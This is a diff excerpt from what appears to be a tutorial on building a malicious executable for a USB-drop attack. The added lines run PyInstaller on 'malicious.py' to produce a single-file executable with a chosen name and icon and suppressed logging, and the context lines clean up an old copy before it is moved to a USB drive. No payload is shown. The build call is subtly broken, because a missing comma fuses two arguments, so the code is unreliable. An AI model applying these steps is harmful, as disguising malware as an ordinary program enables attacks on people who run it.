@@ -35,6 +35,19 @@ Then getting current working directory or any directory if needed. And then we d
 if os.path.isfile(exename):
     os.remove(exename)
 Then this is little cleanup code here, saying that if the executable already exist, we should remove it because the operation which we going to perform wont work , when we try to move it on to the USB (if that usb already exist).
-
-
 print("Creating EXE")
+
+
+
+Then our first step is to use PyInstaller to create a malicious executable. The below is the actual comamnd for that.
+PyInstaller.__main__.run([
+    "malicious.py"
+    "--onefile",
+    "--clean",
+    "--log-level=ERROR",
+    "--name="+exename,
+    "--icon="+icon
+])
+
+So here, we are calling PyInstaller main function and then calling run inside of that. And reason why that we have this slightly different syntax here for function calls is typically the PyInstaller is designed to be run as a standalone program on the command line terminal itself
+
